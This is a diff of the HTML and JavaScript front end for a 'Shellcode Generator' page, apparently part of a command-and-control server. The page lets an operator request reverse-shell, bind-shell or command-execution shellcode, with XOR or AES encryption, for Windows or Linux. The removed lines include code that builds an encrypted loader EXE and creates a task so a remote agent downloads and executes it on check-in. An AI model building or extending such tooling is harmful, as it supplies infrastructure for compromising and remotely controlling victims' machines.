@@ -3,12 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shellcode Generator - C2 Server</title>
-
-    <!-- Highlight.js for syntax highlighting -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
-
+    <title>Shellcode Generator</title>
     <style>
         :root {
             --bg: #f4f4f4;
@@ -16,9 +11,6 @@
             --card: #fff;
             --border: #ddd;
             --primary: #007BFF;
-            --success: #28a745;
-            --danger: #dc3545;
-            --warning: #ffc107;
         }
 
         [data-theme="dark"] {
@@ -39,86 +31,60 @@
         }
 
         .container {
-            max-width: 1200px;
+            max-width: 800px;
             margin: 0 auto;
-            text-align: center;
+            background-color: var(--card);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
         h1 {
-            color: var(--text);
             text-align: center;
-            margin-bottom: 30px;
-            font-size: 2.5em;
-        }
-
-        nav {
-            margin-bottom: 30px;
-            text-align: center;
-        }
-
-        nav a {
-            margin: 0 15px;
-            text-decoration: none;
-            color: var(--primary);
-            font-weight: 500;
-            font-size: 1.1em;
-            transition: color 0.3s;
-        }
-
-        nav a:hover {
             color: var(--text);
-        }
-
-        .form-container {
-            background-color: var(--card);
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            margin: 20px auto;
-            max-width: 800px;
-            text-align: left;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 5px;
             color: var(--text);
-            font-weight: 500;
         }
 
-        input[type="text"],
-        select {
+        input, select {
             width: 100%;
-            padding: 10px;
+            padding: 8px;
             border: 1px solid var(--border);
             border-radius: 4px;
             background-color: var(--bg);
             color: var(--text);
-            font-size: 14px;
-        }
-
-        select {
-            cursor: pointer;
         }
 
         button {
             background-color: var(--primary);
             color: white;
+            padding: 10px 20px;
             border: none;
-            padding: 12px 24px;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 16px;
-            transition: all 0.3s;
+            width: 100%;
         }
 
         button:hover {
             opacity: 0.9;
-            transform: translateY(-1px);
+        }
+
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            background-color: var(--bg);
+            white-space: pre-wrap;
+            word-break: break-all;
         }
 
         .toggle-theme {
@@ -131,51 +97,25 @@
             padding: 8px 15px;
             border-radius: 4px;
             cursor: pointer;
-            transition: all 0.3s;
+            width: auto;
         }
 
-        .toggle-theme:hover {
-            background-color: var(--primary);
-            color: white;
-            border-color: var(--primary);
+        nav {
+            margin-bottom: 30px;
+            text-align: center;
         }
 
-        #output {
-            margin-top: 30px;
-            text-align: left;
-        }
-
-        .output-container {
-            background-color: var(--card);
-            padding: 20px;
-            border-radius: 8px;
-            margin-top: 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        pre {
-            background-color: var(--bg);
-            padding: 15px;
-            border-radius: 4px;
-            overflow-x: auto;
-            margin: 0;
-        }
-
-        .copy-button {
-            margin-top: 10px;
-            background-color: var(--success);
-        }
-
-        .download-button {
-            margin-top: 10px;
-            margin-left: 10px;
-            background-color: var(--primary);
+        nav a {
+            margin: 0 15px;
+            text-decoration: none;
+            color: var(--primary);
+            font-weight: 500;
         }
     </style>
 </head>
 <body>
     <button class="toggle-theme" onclick="toggleTheme()">🌙 Toggle Dark Mode</button>
-
+    
     <div class="container">
         <h1>Shellcode Generator</h1>
         <nav>
@@ -183,153 +123,68 @@
             <a href="/shellcode">Shellcode Generator</a>
             <a href="/control">Task Control Panel</a>
         </nav>
-
-        <div class="form-container">
-            <form id="shellcodeForm">
-                <div class="form-group">
-                    <label for="platform">Target Platform:</label>
-                    <select id="platform" required>
-                        <option value="windows">Windows</option>
-                        <option value="linux">Linux</option>
-                        <option value="macos">macOS</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label for="shellcodeType">Shellcode Type:</label>
-                    <select id="shellcodeType" required>
-                        <option value="reverse">Reverse Shell</option>
-                        <option value="bind">Bind Shell</option>
-                        <option value="exec">Command Execution</option>
-                    </select>
-                </div>
-
-                <div class="form-group" id="hostGroup">
-                    <label for="host">Host (for Reverse Shell):</label>
-                    <input type="text" id="host" placeholder="e.g., 192.168.1.100">
-                </div>
-
-                <div class="form-group">
-                    <label for="port">Port:</label>
-                    <input type="number" id="port" required placeholder="e.g., 4444">
-                </div>
-
-                <div class="form-group" id="commandGroup" style="display: none;">
-                    <label for="command">Command:</label>
-                    <input type="text" id="command" placeholder="e.g., calc.exe">
-                </div>
-
-                <div class="form-group">
-                    <label for="encoding">Encoding:</label>
-                    <select id="encoding">
-                        <option value="base64">Base64</option>
-                        <option value="hex">Hex</option>
-                        <option value="ascii">ASCII</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label for="encryption">Encryption:</label>
-                    <select id="encryption">
-                        <option value="none">None</option>
-                        <option value="xor">XOR</option>
-                        <option value="aes">AES</option>
-                    </select>
-                </div>
-
-                <div class="form-group" id="keyGroup" style="display: none;">
-                    <label for="key">Encryption Key:</label>
-                    <input type="text" id="key" placeholder="Enter encryption key">
-                    <button type="button" onclick="generateRandomKey()">Generate Random Key</button>
-                </div>
-
-                <button type="submit">Generate Shellcode</button>
-            </form>
+        
+        <div class="form-group">
+            <label for="type">Shellcode Type:</label>
+            <select id="type" onchange="updateForm()">
+                <option value="reverse">Reverse Shell</option>
+                <option value="bind">Bind Shell</option>
+                <option value="exec">Execute Command</option>
+            </select>
         </div>
 
-        <div id="output" style="display: none;">
-            <h2>Generated Shellcode</h2>
-            <div class="output-container">
-                <pre><code id="shellcodeOutput">No shellcode generated yet...</code></pre>
-                <button class="copy-button" onclick="copyShellcode()">📋 Copy Shellcode</button>
-                <button class="download-button" onclick="downloadShellcode()">⬇️ Download</button>
-            </div>
+        <div class="form-group" id="hostGroup">
+            <label for="host">Host:</label>
+            <input type="text" id="host" placeholder="Enter host (e.g. 192.168.1.100)">
         </div>
+
+        <div class="form-group" id="portGroup">
+            <label for="port">Port:</label>
+            <input type="number" id="port" placeholder="Enter port (e.g. 4444)">
+        </div>
+
+        <div class="form-group" id="commandGroup" style="display: none;">
+            <label for="command">Command:</label>
+            <input type="text" id="command" placeholder="Enter command to execute">
+        </div>
+
+        <div class="form-group">
+            <label for="platform">Platform:</label>
+            <select id="platform">
+                <option value="windows">Windows</option>
+                <option value="linux">Linux</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="encoding">Encoding:</label>
+            <select id="encoding">
+                <option value="base64">Base64</option>
+                <option value="hex">Hex</option>
+                <option value="raw">Raw</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="encryption">Encryption:</label>
+            <select id="encryption" onchange="toggleKey()">
+                <option value="none">None</option>
+                <option value="xor">XOR</option>
+                <option value="aes">AES</option>
+            </select>
+        </div>
+
+        <div class="form-group" id="keyGroup" style="display: none;">
+            <label for="key">Encryption Key:</label>
+            <input type="text" id="key" placeholder="Enter encryption key">
+        </div>
+
+        <button onclick="generateShellcode()">Generate Shellcode</button>
+
+        <div id="result"></div>
     </div>
 
     <script>
-        let encodedShellcode = '';
-
-        function highlight() {
-            const codeBlock = document.getElementById('shellcodeOutput');
-            hljs.highlightElement(codeBlock);
-        }
-
-        document.getElementById('shellcodeType').addEventListener('change', function () {
-            const type = this.value;
-            document.getElementById('hostGroup').style.display = type === 'reverse' ? 'block' : 'none';
-            document.getElementById('commandGroup').style.display = type === 'exec' ? 'block' : 'none';
-        });
-
-        document.getElementById('encryption').addEventListener('change', function () {
-            const keyGroup = document.getElementById('keyGroup');
-            keyGroup.style.display = this.value !== 'none' ? 'block' : 'none';
-        });
-
-        document.getElementById('shellcodeForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const formData = {
-                platform: document.getElementById('platform').value,
-                type: document.getElementById('shellcodeType').value,
-                host: document.getElementById('host').value,
-                port: document.getElementById('port').value,
-                encoding: document.getElementById('encoding').value,
-                encryption: document.getElementById('encryption').value
-            };
-
-            try {
-                const response = await fetch('/api/generate_shellcode', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(formData)
-                });
-
-                const data = await response.json();
-                if (data.shellcode) {
-                    document.getElementById('output').style.display = 'block';
-                    document.getElementById('shellcodeOutput').textContent = data.shellcode;
-                } else {
-                    throw new Error(data.error || 'Failed to generate shellcode');
-                }
-            } catch (error) {
-                alert('Error: ' + error.message);
-            }
-        });
-
-        function copyShellcode() {
-            const shellcode = document.getElementById('shellcodeOutput').textContent;
-            navigator.clipboard.writeText(shellcode).then(() => {
-                const copyBtn = document.querySelector('.copy-button');
-                copyBtn.textContent = '✅ Copied!';
-                setTimeout(() => copyBtn.textContent = '📋 Copy Shellcode', 2000);
-            });
-        }
-
-        function downloadShellcode() {
-            const shellcode = document.getElementById('shellcodeOutput').textContent;
-            const blob = new Blob([shellcode], { type: 'text/plain' });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'shellcode.txt';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            window.URL.revokeObjectURL(url);
-        }
-
         function toggleTheme() {
             const current = localStorage.getItem('theme') || 'light';
             const next = current === 'light' ? 'dark' : 'light';
@@ -337,186 +192,87 @@
             document.body.setAttribute('data-theme', next);
         }
 
-        document.getElementById('generateExeLoaderBtn').addEventListener('click', function() {
-            if (!encodedShellcode) {
-                alert('Please generate shellcode first!');
-                return;
+        // Initialize theme
+        document.body.setAttribute('data-theme', localStorage.getItem('theme') || 'light');
+
+        function updateForm() {
+            const type = document.getElementById('type').value;
+            const hostGroup = document.getElementById('hostGroup');
+            const portGroup = document.getElementById('portGroup');
+            const commandGroup = document.getElementById('commandGroup');
+
+            if (type === 'reverse') {
+                hostGroup.style.display = 'block';
+                portGroup.style.display = 'block';
+                commandGroup.style.display = 'none';
+            } else if (type === 'bind') {
+                hostGroup.style.display = 'none';
+                portGroup.style.display = 'block';
+                commandGroup.style.display = 'none';
+            } else if (type === 'exec') {
+                hostGroup.style.display = 'none';
+                portGroup.style.display = 'none';
+                commandGroup.style.display = 'block';
+            }
+        }
+
+        function toggleKey() {
+            const encryption = document.getElementById('encryption').value;
+            const keyGroup = document.getElementById('keyGroup');
+            keyGroup.style.display = encryption === 'none' ? 'none' : 'block';
+        }
+
+        async function generateShellcode() {
+            const type = document.getElementById('type').value;
+            const host = document.getElementById('host').value;
+            const port = document.getElementById('port').value;
+            const command = document.getElementById('command').value;
+            const platform = document.getElementById('platform').value;
+            const encoding = document.getElementById('encoding').value;
+            const encryption = document.getElementById('encryption').value;
+            const key = document.getElementById('key').value;
+
+            const data = {
+                type,
+                platform,
+                encoding,
+                encryption,
+                key
+            };
+
+            if (type === 'reverse') {
+                data.host = host;
+                data.port = parseInt(port);
+            } else if (type === 'bind') {
+                data.port = parseInt(port);
+            } else if (type === 'exec') {
+                data.command = command;
             }
 
-            // Get encryption settings
-            const encType = document.getElementById('loaderEncryption').value;
-            const encKey = document.getElementById('loaderEncKey').value;
-
-            // Show loading state
-            this.innerHTML = '⏳ Generating...';
-            this.disabled = true;
-            
-            // Try the form-based approach as a more reliable method
             try {
-                // Set the shellcode and encryption settings in the hidden form fields
-                document.getElementById('shellcodeInput').value = encodedShellcode;
-                document.getElementById('encryptionTypeInput').value = encType;
-                document.getElementById('encryptionKeyInput').value = encKey;
-                
-                // Create a download frame
-                let downloadFrame = document.getElementById('downloadFrame');
-                if (!downloadFrame) {
-                    downloadFrame = document.createElement('iframe');
-                    downloadFrame.id = 'downloadFrame';
-                    downloadFrame.name = 'downloadFrame';
-                    downloadFrame.style.display = 'none';
-                    document.body.appendChild(downloadFrame);
-                }
-                
-                // Configure the form to use the iframe
-                const form = document.getElementById('exeGeneratorForm');
-                form.target = 'downloadFrame';
-                
-                // Submit the form to generate and download the EXE
-                form.submit();
-                
-                // Show deploy options
-                document.getElementById('deployOptions').style.display = 'block';
-                
-                // Update button state
-                setTimeout(() => {
-                    this.innerHTML = '✅ Generated!';
-                    setTimeout(() => {
-                        this.innerHTML = '🔐 Generate Encrypted EXE';
-                        this.disabled = false;
-                    }, 1500);
-                }, 2000);
-                
-            } catch (err) {
-                console.error('Error with form-based download:', err);
-                
-                // Fallback to fetch API if form submission fails
-                useFetchAPIForDownload(this, encType, encKey);
-            }
-        });
-        
-        // Fallback function using fetch API
-        function useFetchAPIForDownload(buttonElement, encType, encKey) {
-            fetch('/generate_loader_exe', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    shellcode: encodedShellcode,
-                    encryption: encType,
-                    key: encKey
-                })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    // Try to get error message if available
-                    return response.json()
-                        .then(err => { throw new Error(err.error || 'Failed to generate loader'); })
-                        .catch(e => { throw new Error(`HTTP ${response.status}: Failed to generate loader`); });
-                }
-                return response.blob();
-            })
-            .then(blob => {
-                // Create download link
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'shellcode_loader.exe';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                
-                // Show deploy options
-                document.getElementById('deployOptions').style.display = 'block';
-                
-                // Update button state
-                buttonElement.innerHTML = '✅ Generated!';
-                setTimeout(() => {
-                    buttonElement.innerHTML = '🔐 Generate Encrypted EXE';
-                    buttonElement.disabled = false;
-                }, 1500);
-            })
-            .catch(err => {
-                console.error('Error generating loader:', err);
-                alert('Error: ' + err.message);
-                buttonElement.innerHTML = '❌ Failed';
-                setTimeout(() => {
-                    buttonElement.innerHTML = '🔐 Generate Encrypted EXE';
-                    buttonElement.disabled = false;
-                }, 1500);
-            });
-        }
-        
-        // Function to deploy loader to an agent
-        document.getElementById('deployToAgentBtn').addEventListener('click', function() {
-            const agentId = document.getElementById('agentId').value.trim();
-            
-            if (!agentId) {
-                alert('Please enter an agent ID');
-                return;
-            }
-            
-            // Get server URL
-            const serverUrl = window.location.origin;
-            const loaderUrl = `${serverUrl}/generate_loader_exe`;
-            
-            // Show loading state
-            this.innerHTML = '⏳ Deploying...';
-            this.disabled = true;
-            document.getElementById('deployStatus').textContent = 'Creating task for agent...';
-            
-            // Create task for agent
-            fetch('/api/tasks', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    agent_id: agentId,
-                    loader_url: loaderUrl
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.error) {
-                    throw new Error(data.error);
-                }
-                
-                // Show success message
-                document.getElementById('deployStatus').innerHTML = 
-                    `<span style="color: green;">✅ Task created successfully!</span><br>` +
-                    `Task ID: ${data.task_id}<br>` +
-                    `The agent will download and execute the loader on next check-in.`;
-                
-                // Update button state
-                this.innerHTML = '✅ Deployed!';
-                setTimeout(() => {
-                    this.innerHTML = '📡 Deploy Loader to Agent';
-                    this.disabled = false;
-                }, 1500);
-            })
-            .catch(err => {
-                document.getElementById('deployStatus').innerHTML = 
-                    `<span style="color: red;">❌ Deployment failed: ${err.message}</span>`;
-                
-                this.innerHTML = '❌ Failed';
-                setTimeout(() => {
-                    this.innerHTML = '📡 Deploy Loader to Agent';
-                    this.disabled = false;
-                }, 1500);
-            });
-        });
+                const response = await fetch('/api/generate_shellcode', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
 
-        function generateRandomKey(length = 16) {
-            const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
-            let key = "";
-            for (let i = 0; i < length; i++) {
-                key += charset[Math.floor(Math.random() * charset.length)];
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('result').textContent = result.shellcode;
+                } else {
+                    document.getElementById('result').textContent = `Error: ${result.error}`;
+                }
+            } catch (error) {
+                document.getElementById('result').textContent = `Error: ${error.message}`;
             }
-            document.getElementById('key').value = key;
         }
 
-        window.onload = function () {
-            const savedTheme = localStorage.getItem('theme') || 'light';
-            document.body.setAttribute('data-theme', savedTheme);
-        };
+        // Initialize form
+        updateForm();
+        toggleKey();
     </script>
 </body>
 </html>
